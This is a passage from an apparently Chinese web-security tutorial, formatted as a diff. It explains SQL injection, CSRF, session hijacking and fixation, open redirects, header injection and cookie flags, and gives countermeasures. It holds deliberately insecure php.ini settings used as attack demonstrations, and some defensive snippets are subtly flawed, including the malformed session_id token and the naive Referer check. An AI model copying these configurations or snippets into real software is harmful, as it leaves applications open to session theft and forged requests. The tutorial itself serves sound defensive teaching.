+<li>数据库信息被窃取</li>
+<li>数据库内容被篡改</li>
+<li>登陆认证失效</li>
+<li>其他如, 服务器文件被读取/修改, 服务器程序执行</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>对象</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>产生地点</td>
+<td>调用SQL语句的地方</td>
+</tr>
+<tr>
+<td>影响范围</td>
+<td>所有页面</td>
+</tr>
+<tr>
+<td>影响类型</td>
+<td>信息泄露、篡改数据、绕过认证、浏览编辑文件</td>
+</tr>
+<tr>
+<td>影响程度</td>
+<td>大</td>
+</tr>
+<tr>
+<td>用户参与程度</td>
+<td>不需要</td>
+</tr>
+<tr>
+<td>对策概要</td>
+<td>使用静态占位符, 预编译模式运行SQL</td>
+</tr>
+</tbody></table>
+<p>SQL注入攻击方式多种多样 , 暂不具体展开, 后续开专题详细介绍, 应对方式一般使用静态占位符预编译即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from tb_user where name = ? and pwd = ? limit 1&quot;</span>;</span><br><span class="line"><span class="variable">$pdo_stmt</span> = <span class="variable">$mysql</span>-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$pdo_stmt</span>-&gt;execute(<span class="variable">$dataArray</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$pdo_stmt</span>-&gt;fetchAll();</span><br></pre></td></tr></table></figure>
+
+<p> <strong>其他辅助对策</strong>:</p>
+<ul>
+<li>不显示详细错误信息 </li>
+<li>校验输入值有效性</li>
+<li>设置数据库权限</li>
+</ul>
+<h2 id="关键处理中引入的安全隐患-CSRF"><a href="#关键处理中引入的安全隐患-CSRF" class="headerlink" title="关键处理中引入的安全隐患-CSRF"></a>关键处理中引入的安全隐患-CSRF</h2><p>关键处理中如果存在安全隐患, 可能产生跨站请求伪造(CSRF)的漏洞</p>
+<blockquote>
+<p>关键处理  - 账号转账/发送邮件/密码更改 等一旦完成无法撤销的操作</p>
+<p>CSRF  -   跨站请求伪造Cross-Site Request Forgery</p>
+</blockquote>
+<p>执行关键处理前, 需要确认请求确实是用户自愿发起的. 如果存在CSRF漏洞, 可能造成:</p>
+<ul>
+<li>攻击者使用用户的账号 下单购物/发帖</li>
+<li>攻击者删除用户账号</li>
+<li>攻击者更改用户的密码/邮箱</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>对象</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>产生地点</td>
+<td>以下任意网站上执行关键处理的页面:<br />- 仅使用Cookie进行会话处理的网站<br />- 仅依靠HTTP认证、SSL证书、手机移动ID标识用户的网站</td>
+</tr>
+<tr>
+<td>影响范围</td>
+<td>存在CSRF漏洞的页面</td>
+</tr>
+<tr>
+<td>影响类型</td>
+<td>以用户权限执行关键处理</td>
+</tr>
+<tr>
+<td>影响程度</td>
+<td>中 ~ 大</td>
+</tr>
+<tr>
+<td>用户参与程度</td>
+<td>需要 -&gt; 点击恶意链接、浏览恶意网站</td>
+</tr>
+<tr>
+<td>对策概要</td>
+<td>执行关键处理前, 确认是正规用户发起请求</td>
+</tr>
+</tbody></table>
+<h3 id="典型攻击模式"><a href="#典型攻击模式" class="headerlink" title="典型攻击模式"></a>典型攻击模式</h3><ul>
+<li><p>1.目标页面</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e83386364b6d0c26fe9c4214ee39c687-2d6293d.png" alt="image-20220909112236956"></p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5118161300b4a391b533193c1bccdab5-61b4e6f.png" alt="image-20220909112353922"></p>
+<p>整个页面工作流程为: </p>
+<ul>
+<li>确认用户登陆状态, 显示修改密码链接</li>
+<li>用户输入新密码, 通过POST将信息传入后台处理脚本</li>
+<li>后台接收数据, 修改当前用户密码并回显</li>
+</ul>
+</li>
+<li><p>2.构建钓鱼页面, 诱使用户点击</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c2e47deac0e92cbcb8e8871d901fca62-9e3ee52.png" alt="image-20220909112735590"></p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4b58b688040bbd7cb0da4c8ed422bb4c-7adf890.png" alt="image-20220909112934443"></p>
+</li>
+<li><p>3.攻击流程</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f0a5d4d6507941ee1ba6e1ff843bc96c-e833054.png" alt="image-20220909113243497"></p>
+<p>根据同源策略, iframe外层(恶意网页) 无法读取到内部(目标网页) 的内容, 因此, CSRF攻击无法获取目标的内容, 但可以模拟用户操作, 使用当前用户的Cookie修改用户密码, 从而达到攻击目标</p>
+</li>
+</ul>
+<h3 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h3><p>防御CSRF关键为 确认关键处理的请求确实是来自正规用户自愿发起的. 因此需要执行以下两点:</p>
+<ul>
+<li>筛选需要防范CSRF攻击的页面(关键处理页面)</li>
+<li>使代码能判断当前操作是否为用户主观行为</li>
+</ul>
+<p><strong>确认正规用户自愿发起请求方式</strong>:</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7108dd61f870ad1561862b1699c67401-c636235.png" alt="image-20220909113900268"></p>
+<ul>
+<li><p>嵌入机密信息(令牌)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关键页面</span></span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;token&quot;</span> value=<span class="string">&quot;&lt;?php echo htmlspecialchars(session_id) ?&gt;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 后台处理</span></span><br><span class="line"><span class="keyword">if</span> (session_id() !== <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>]) <span class="keyword">die</span>(<span class="string">&#x27;请从正规页面操作&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
+<li><p>再次输入密码</p>
+<p>发送确认短信/输入密码, 确保是用户自愿发起, 但需要保证确认密码页面是最后的执行页面, 否则可能被跳过</p>
+</li>
+<li><p>检验Referer</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>] !== WEB_HOST) <span class="keyword">die</span>(<span class="string">&#x27;REFERER检测失败&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>防范策略比较</strong> </p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>嵌入令牌</th>
+<th>确认密码</th>
+<th>确认REFERER</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>开发耗时</td>
+<td>中</td>
+<td>中</td>
+<td>小</td>
+</tr>
+<tr>
+<td>用户影响</td>
+<td>无</td>
+<td>增加输入密码步骤</td>
+<td>关闭Referer用户无法使用</td>
+</tr>
+<tr>
+<td>手机网站适用</td>
+<td>可以</td>
+<td>可以</td>
+<td>不可以</td>
+</tr>
+<tr>
+<td>建议使用位置</td>
+<td>基本策略, 所有情况均可适用</td>
+<td>防范他人伪装需求较强的页面</td>
+<td>可以限定用户环境</td>
+</tr>
+</tbody></table>
+<h3 id="辅助性对策"><a href="#辅助性对策" class="headerlink" title="辅助性对策"></a>辅助性对策</h3><p>执行关键处理后, 可以向用户注册邮箱发送相关处理内容的通知, 让用户第一时间知情, 降低损害</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/328a63fa24f412a96b28b834b403439a-5a51513.png" alt="image-20220907102354779"></p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b2afb282f2858018f2b14df3039376f8-88adc0d.png" alt="image-20220907103556039"></p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e34eb616c1d76ff51216bce014492c01-de36d7a.png" alt="image-20220907105331970"></p>
+<p>方式:</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/eb62cbdb2cbcc7351eb9f5295f853ad4-c050011.png" alt="image-20220907111639726"></p>
+<p>检查Referer</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/07b0207e96cdca12ab1fa484c79b5dbb-0c30532.png" alt="image-20220907111539038"></p>
+<p>嵌入机密令牌(Token )</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/307a2ad70df94ae2f31ccddf3e6e993b-d54d5c6.png" alt="image-20220907110830638"></p>
+<p>再次输入密码/短信确认信息</p>
+<p>(密码确认需要在最后一个执行确认节点, 否则还是存在CSRF漏洞)</p>
+<p>辅助对策: 执行关键处理后, 向注册邮箱发送通知</p>
+<h2 id="不完善的会话管理"><a href="#不完善的会话管理" class="headerlink" title="不完善的会话管理"></a>不完善的会话管理</h2><p>Web应用中经常使用会话管理机制来记忆认证结果等状态. 一般使用<strong>Cookie</strong>记忆当前<strong>会话ID</strong>, 因此, 会话ID的作用相当于获取服务器端信息的钥匙</p>
+<p>如果由于某些原因, 用户的会话ID被第三方得知, 就会出现他人伪装用户访问的风险, 这种攻击手段就称为<strong>会话劫持</strong></p>
+<h3 id="第三方获取会话ID方式"><a href="#第三方获取会话ID方式" class="headerlink" title="第三方获取会话ID方式"></a>第三方获取会话ID方式</h3><ul>
+<li>预测 会话ID</li>
+<li>窃取 会话ID</li>
+<li>挟持 会话ID</li>
+</ul>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/40db245eb8a5306c5cf9a36661a4b498-0bbf153.png" alt="image-20220907113217019"></p>
+<h4 id="预测会话ID"><a href="#预测会话ID" class="headerlink" title="预测会话ID"></a>预测会话ID</h4><p>如果生成会话ID的方式不妥善, 可能会被第三方预测成功, 如连续的数值, 基于日期、用户名生成, 开源软件中可预测的生成代码逻辑等</p>
+<h4 id="窃取会话ID"><a href="#窃取会话ID" class="headerlink" title="窃取会话ID"></a>窃取会话ID</h4><p>窃取会话ID方式有以下几种:</p>
+<ul>
+<li><p>生成时Cookie属性设置不妥善(httponly)</p>
+</li>
+<li><p>明文传输, 被网络监听</p>
+</li>
+<li><p>由于跨站脚本安全隐患泄露</p>
+</li>
+<li><p>PHP或浏览器平台安全隐患泄露</p>
+</li>
+<li><p>会话ID在URL中使用, 经由Referer泄露(支持发布外链)</p>
+</li>
+</ul>
+<p>可能导致安全隐患:</p>
+<ul>
+<li>跨站脚本攻击(XSS)</li>
+<li>HTTP消息头注入</li>
+<li>嵌入在URL中的会话ID</li>
+</ul>
+<h4 id="劫持会话ID"><a href="#劫持会话ID" class="headerlink" title="劫持会话ID"></a>劫持会话ID</h4><p>将<strong>会话ID</strong>强制设置到用户浏览器中, 也就相当于攻击者得知了用户的会话ID, 称为 <strong>会话固定攻击</strong>(Session Fixation Attack)</p>
+<h3 id="安全隐患"><a href="#安全隐患" class="headerlink" title="安全隐患"></a>安全隐患</h3><h4 id="会话ID可预测"><a href="#会话ID可预测" class="headerlink" title="会话ID可预测"></a>会话ID可预测</h4><table>
+<thead>
+<tr>
+<th>对象</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>产生地点</td>
+<td>生成会话ID的地方</td>
+</tr>
+<tr>
+<td>影响范围</td>
+<td>Web应用使用会话管理的所有页面</td>
+</tr>
+<tr>
+<td>影响类型</td>
+<td>伪装用户</td>
+</tr>
+<tr>
+<td>影响程度</td>
+<td>大</td>
+</tr>
+<tr>
+<td>用户参与程度</td>
+<td>不需要</td>
+</tr>
+<tr>
+<td>对策概要</td>
+<td>停止自己实现会话管理机制, 而使用平台或语言提供的会话机制</td>
+</tr>
+</tbody></table>
+<p><strong>攻击步骤</strong>:</p>
+<ul>
+<li>1.收集对象应用的会话ID</li>
+<li>推测会话ID生成规则</li>
+<li>在对象应用中实验生成的会话ID</li>
+</ul>
+<p><strong>常见会话ID生成方式</strong>:</p>
+<p>会话ID一般都是基于以下内容生成:</p>
+<ul>
+<li><p>用户ID或邮箱地址</p>
+</li>
+<li><p>远程IP地址</p>
+</li>
+<li><p>日期与实践(UNIX时间戳或年月日时分秒字符串)</p>
+</li>
+<li><p>随机数</p>
+</li>
+</ul>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a669e5ba0cdd20ed1a9ef61c58f80536-7d6b5a0.png" alt="image-20220909121157721"></p>
+<p><strong>对策</strong>:</p>
+<p>为了避免生成可预测的会话ID产生安全隐患, 应当停止自己实现会话管理机制, 而使用平台或语言提供的会话机制</p>
+<h4 id="会话ID嵌入URL"><a href="#会话ID嵌入URL" class="headerlink" title="会话ID嵌入URL"></a>会话ID嵌入URL</h4><p>会话ID有时并不保存在Cookie中, 而是被保存于URL. 由于一些手机浏览器不支持Cookie, 因此这种做法也经常使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/login.php?PHPSESSID=onjic14un02ccjqilsq8uq8as0</span><br></pre></td></tr></table></figure>
+
+<p>会话ID嵌入URL可能导致会话ID经由Referer外协, 从而造成伪装攻击</p>
+<table>
+<thead>
+<tr>
+<th>对象</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>产生地点</td>
+<td>生成会话ID的地方</td>
+</tr>
+<tr>
+<td>影响范围</td>
+<td>Web应用使用会话管理的所有页面</td>
+</tr>
+<tr>
+<td>影响类型</td>
+<td>伪装用户</td>
+</tr>
+<tr>
+<td>影响程度</td>
+<td>中 ~ 大</td>
+</tr>
+<tr>
+<td>用户参与程度</td>
+<td>需要 -&gt; 点击链接, 浏览邮件附属URL</td>
+</tr>
+<tr>
+<td>对策概要</td>
+<td>在程序中设置禁止嵌入会话ID到URL</td>
+</tr>
+</tbody></table>
+<p><strong>PHP会话设置</strong></p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># php.ini</span></span><br><span class="line"><span class="comment">## 使用Cookie保存会话ID, 默认On(1)</span></span><br><span class="line"><span class="meta">session.use_cookies</span> = <span class="string">1	  </span></span><br><span class="line"><span class="comment">## 仅将会话ID保存在Cookie, 默认On(1)</span></span><br><span class="line"><span class="meta">session.use_only_cookies</span> = <span class="string">1</span></span><br><span class="line"><span class="comment">## 自动将会话ID嵌入URL, 默认Off(0)</span></span><br><span class="line"><span class="meta">session.use_trans_sid</span> = <span class="string">0</span></span><br></pre></td></tr></table></figure>
+
+<p>配置使用效果</p>
+<table>
+<thead>
+<tr>
+<th>use_cookies</th>
+<th>use_only_cookies</th>
+<th>会话ID保存位置</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>On</td>
+<td>On</td>
+<td>会话ID仅保存在Cookie中</td>
+</tr>
+<tr>
+<td>On</td>
+<td>Off</td>
+<td>可以使用Cookie时保存在Cookie中,不能使用时嵌入URL</td>
+</tr>
+<tr>
+<td>Off</td>
+<td>On</td>
+<td>无意义组合</td>
+</tr>
+<tr>
+<td>Off</td>
+<td>Off</td>
+<td>始终将会话ID嵌入URL</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>上述情况中, <code>session.use_trans_sid</code>值为<code>On</code>时, 会话ID会自动嵌入URL, <code>Off</code>时, 仅在需要嵌入时, 才会嵌入</p>
+</blockquote>
+<p><strong>攻击案例</strong></p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># php.ini</span></span><br><span class="line"><span class="meta">session.use_cookies</span> = <span class="string">0	  </span></span><br><span class="line"><span class="meta">session.use_only_cookies</span> = <span class="string">0</span></span><br><span class="line"><span class="meta">session.use_trans_sid</span> = <span class="string">1</span></span><br></pre></td></tr></table></figure>
+
+<p>构建钓鱼页面, 诱使用户点击</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2b8ab5ee31afaa29daf9c8c1a74f4207-bb9d70b.png" alt="image-20220909163655413"></p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c36eafce4a03d2075ef093ed3898ae68-b5a86ae.png" alt="image-20220909163754243"></p>
+<p><strong>攻击条件</strong></p>
+<p>网站同时满足以下两个条件是, 存在会话ID失窃的风险</p>
+<ul>
+<li>能够使用被嵌入URL的会话ID</li>
+<li>存在跳转至外部网站的链接. 或用户可以发布自己的链接</li>
+</ul>
+<p><strong>对策</strong></p>
+<p>PHP设置仅使用Cookie保存会话ID, 不开启嵌入URL配置, 即默认配置</p>
+<h4 id="固定会话ID"><a href="#固定会话ID" class="headerlink" title="固定会话ID"></a>固定会话ID</h4><p>会话攻击的另一种手段为从外部劫持会话ID, 即会话固定攻击. 攻击流程如下:</p>
+<ul>
+<li>1.取得目标网站的会话ID或自己指定ID</li>
+<li>2.强行将上述会话ID交给用户</li>
+<li>3.用户登陆目标Web应用</li>
+<li>4.攻击者使用该会话ID伪装用户进入Web应用</li>
+</ul>
+<blockquote>
+<p>应对会话固定攻击时, 彻底杜绝步骤2比较困难, 因此一般采用用户登陆时更换其会话ID的方式</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>对象</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>产生地点</td>
+<td>进行登陆处理的页面</td>
+</tr>
+<tr>
+<td>影响范围</td>
+<td>Web应用使用会话管理的所有页面</td>
+</tr>
+<tr>
+<td>影响类型</td>
+<td>伪装用户</td>
+</tr>
+<tr>
+<td>影响程度</td>
+<td>中 ~ 大</td>
+</tr>
+<tr>
+<td>用户参与程度</td>
+<td>需要 -&gt; 点击链接, 浏览邮件附属URL</td>
+</tr>
+<tr>
+<td>对策概要</td>
+<td>用户登陆时更换会话ID</td>
+</tr>
+</tbody></table>
+<p><strong>攻击案例</strong></p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># php.ini</span></span><br><span class="line"><span class="meta">session.use_cookies</span> = <span class="string">1 </span></span><br><span class="line"><span class="meta">session.use_only_cookies</span> = <span class="string">0</span></span><br><span class="line"><span class="meta">session.use_trans_sid</span> = <span class="string">1</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>1.目标页面, 登陆</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b029b662b01229f0d4a3e1d58e7e8921-52f46f7.png" alt="image-20220909170628330"></p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c6eb98a75be2fef804edcc6b72faa0c3-360995f.png" alt="image-20220909170746289"></p>
+</li>
+<li><p>构建钓鱼链接, 诱使用户点击登陆</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/406bdbd2f8cdff7b0e0209bb84556f25-52c8aac.png" alt="image-20220909170828538"></p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3926a67c19a11654e615926244a565fe-f5e8eee.png" alt="image-20220909171110803"></p>
+</li>
+</ul>
+<p><strong>对策</strong></p>
+<p>由于框架/平台存在**会话采纳(Session Adoption)**机制, 会采用预先提供的会话ID来生成会话. 存在以下对策:</p>
+<ul>
+<li><p><strong>方案一 认证登陆后更改会话ID</strong></p>
+<p>PHP中可以使用函数 <code>session_regenerate_id()</code> , 当指定参数为<code>ture</code>时, 会自动生成新的会话ID. 格式如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> session_regenerate_id([<span class="keyword">bool</span> <span class="variable">$delete_old_session</span> = <span class="literal">false</span>])</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/0acb6220fb22e8ebac9c46a6a2ccf255-eebd6c2.png" alt="image-20220909172001418"></p>
+</li>
+<li><p><strong>方案二 采用令牌</strong></p>
+<p>登陆/注册时, 生成一个随机字符串(令牌), 将其同时保存在Cookie和会话变量中. 然后在各页面确认比较Cookie和令牌值, 如果两者一致则视为认证成功, 不一致时认证失败.</p>
+<p>由于只有在登陆时令牌才发布, 攻击者不经过登陆页, 无法获取令牌值, 可以成功防御会话固定攻击</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7f04c67dec6e85b43c60d0785faba5eb-2e65b65.png" alt="image-20220909175701763"></p>
+</li>
+</ul>
+<p><strong>辅助对策</strong></p>
+<p>如果登陆前使用了会话变量, 防范会话固定攻击比较难. 在这种状况下, 也可以使用hidden参数来传递值, 或与以下方式组合使用:</p>
+<ul>
+<li>不再登陆前的会话变量中存储敏感数据</li>
+<li>不使用嵌入URL的会话ID</li>
+</ul>
+<h2 id="重定向相关"><a href="#重定向相关" class="headerlink" title="重定向相关"></a>重定向相关</h2><p>Web应用中有时会重定向到外界指定的URL. 典型案例为: 在登陆页面参数中指定URL, 登陆成功后重定向到该URL.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.google.com/accounts/ServiceLogin?continue=https://mail.google.com/mail</span><br></pre></td></tr></table></figure>
+
+<p>重定向处理时可能产生以下安全风险:</p>
+<ul>
+<li>自由重定向漏洞</li>
+<li>HTTP消息头注入</li>
+</ul>
+<h3 id="自由重定向"><a href="#自由重定向" class="headerlink" title="自由重定向"></a>自由重定向</h3><p>有些Web应用提供了能够重定向到参数指定URL的功能, 即<strong>重定向器(Redirector)</strong>, 其中能够重定向到任意域名的重定向器叫<strong>自由重定向(Open Redirect)</strong>. 自由重定向可能导致用户在不知情状况下被带入其他网站, 从而遭受钓鱼攻击</p>
+<table>
+<thead>
+<tr>
+<th>对象</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>产生地点</td>
+<td>能够重定向到外界指定URL的页面</td>
+</tr>
+<tr>
+<td>影响范围</td>
+<td>Web应用的所有页面</td>
+</tr>
+<tr>
+<td>影响类型</td>
+<td>诱导用户到钓鱼网站, 暴露重要信息</td>
+</tr>
+<tr>
+<td>影响程度</td>
+<td>中 ~ 大</td>
+</tr>
+<tr>
+<td>用户参与程度</td>
+<td>需要 -&gt; 点击链接, 浏览邮件附属URL</td>
+</tr>
+<tr>
+<td>对策概要</td>
+<td>固定重定向目标 或 白名单机制</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>应该评估 [自由重定向功能] 是否不可或缺, 并固定重定向目标. 实在无法固定, 可限制在运行域名范围内</p>
+</blockquote>
+<p><strong>攻击案例</strong> </p>
+<ul>
+<li><p>1.目标页面, 正常登陆流程</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/90f284a4a143655a75824ffcda1426ce-a74d589.png" alt="image-20220909205057240"></p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ade751cbcf447f63c21270d6a920be3c-96c7cce.png" alt="image-20220909205240730"></p>
+</li>
+<li><p>2.构建钓鱼页面, 诱使用户点击</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e51c4e3c1cda51b2eb0057a4851c62d8-4257e93.png" alt="image-20220909205436417"></p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/345583de1e1b940626cbd79228497524-a336fb5.png" alt="image-20220909205806398"></p>
+</li>
+</ul>
+<p>自由重定向漏洞产生的原因主要是:</p>
+<p>1.重定向目标可以由外界指定</p>
+<p>2.没有对重定向目标域名做校验</p>
+<p><strong>对策</strong> </p>
+<ul>
+<li>固定重定向的目标URL</li>
+<li>使用编号指定重定向目标URL</li>
+<li>校验重定向目标域名</li>
+</ul>
+<h3 id="HTTP消息头注入"><a href="#HTTP消息头注入" class="headerlink" title="HTTP消息头注入"></a>HTTP消息头注入</h3><p>HTTP消息头注入漏洞是指, 在重定向或生成Cookie等基于外部传入的参数输出HTTP响应头时查收的安全隐患. 输出响应消息头时, 通过在参数中添加换行符, 就可以实现任意添加响应消息头或伪造消息体的操作</p>
+<p>可能造成以下影响:</p>
+<ul>
+<li><p>生成任意Cookie</p>
+</li>
+<li><p>重定向至任意URL</p>
+</li>
+<li><p>更改页面显示内容</p>
+</li>
+<li><p>执行任意JS代码而造成XSS同样的损害</p>
+</li>
+</ul>
+<p>响应头中的换行符有特殊意义, 一个换行符代表一条属性的结束, 两个换行符代表消息头结束, 消息体开始</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ea61602f148ba8dbd93405f0e4f3b43e-5f92ef0.png" alt="image-20220909212221572"></p>
+<p><strong>请求报文格式</strong>:</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e7c1d15011079f938d9de11fbc29be1d-c06feaa.png" alt="image-20220909210941145"></p>
+<p><strong>响应报文格式</strong>:</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/05d7d0454e0ea2c56e8673df629d2c12-e82ed0e.png" alt="image-20220909211106387"></p>
+<table>
+<thead>
+<tr>
+<th>对象</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>产生地点</td>
+<td>重定向或生成Cookie等基于外部传入的参数输出HTTP响应头的页面</td>
+</tr>
+<tr>
+<td>影响范围</td>
+<td>Web应用的所有页面</td>
+</tr>
+<tr>
+<td>影响类型</td>
+<td>伪装、显示伪造页面、缓存污染</td>
+</tr>
+<tr>
+<td>影响程度</td>
+<td>中 ~ 大</td>
+</tr>
+<tr>
+<td>用户参与程度</td>
+<td>需要 -&gt; 点击链接, 浏览邮件附属URL</td>
+</tr>
+<tr>
+<td>对策概要</td>
+<td>不将外界传入参数作为HTTP响应头输出 或 校验重定向/生成Cookie参数中的换行符</td>
+</tr>
+</tbody></table>
+<p><strong>安全隐患产生原因</strong></p>
+<p>HTTP响应头信息能够以文本格式逐行定义, 也就是说消息头之间以换行符分隔. 如果攻击者指定重定向目标URL或Cookie值参数中插入换行符, 且该换行符直接被作为响应输出, 就会产生HTTP消息头注入</p>
+<p><strong>对策</strong></p>
+<ul>
+<li><p><strong>对策一</strong> 不将外界参数作为HTTP响应消息头输出</p>
+<ul>
+<li>不直接使用URL, 而是从外界获取URL编号, 对应匹配后指定URL</li>
+<li>使用Web服务中的会话变量来移交URL</li>
+</ul>
+</li>
+<li><p><strong>对策二</strong> 校验消息头参数</p>
+<ul>
+<li><p>由专门的API进行重定向或生成Cookie</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">&#x27;location:&#x27;</span> . <span class="variable">$URL</span>);</span><br><span class="line">setcookie();</span><br></pre></td></tr></table></figure></li>
+<li><p>校验生成消息头参数中的换行符</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="cookie输出相关"><a href="#cookie输出相关" class="headerlink" title="cookie输出相关"></a>cookie输出相关</h2><h3 id="用途不当"><a href="#用途不当" class="headerlink" title="用途不当"></a>用途不当</h3><p>不应使用Cookie保存敏感数据, 或过于依赖Cookie中的数据. 因为Cookie是保存在客户端且可以被修改的</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9e28a8d7ecfe3ceca5132f5821b2b7d4-55bd73a.png" alt="image-20220909213435904"></p>
+<blockquote>
+<p>除了控制消息有效期限和不同服务器件共享信息, 除此之外, 会话变量均优于使用Cookie</p>
+</blockquote>
+<h3 id="输出方法不当"><a href="#输出方法不当" class="headerlink" title="输出方法不当"></a>输出方法不当</h3><p>输出Cookie时容易产生安全隐患:</p>
+<ul>
+<li><p>HTTP消息头注入</p>
+</li>
+<li><p>Cookie安全属性设置不完善</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ec14bc38e01a1c3e071897ef418506df-1c0e51c.png" alt="image-20220909213416045"></p>
+<p>Cookie中包含Secure属性, 指定时仅在HTTPS传输下才会被浏览器发送至服务器. 而如果未指定安全属性, 即使应用中使用了HTTPS传输, Cookie也可能会以明文方式传输,  存在监听风险</p>
+<p>为解决这一问题, 最直接的对策是使用Cookie的安全属性. 如果网站中HTTP和HTTPS同时存在,  可以通过添加一个设置安全属性的令牌Cookie, 在每个HTTPS页面中确认令牌值即可</p>
+</li>
+</ul>
+<p><strong>对策</strong></p>
+<ul>
+<li><p><strong>方案一</strong> 设置Secure属性</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># php.ini</span></span><br><span class="line"><span class="meta">session.cookie_secure</span> = <span class="string">1</span></span><br><span class="line"><span class="meta">session.cookie_httponly</span> = <span class="string">1</span></span><br></pre></td></tr></table></figure></li>
+<li><p><strong>方案二</strong> 使用令牌Token</p>
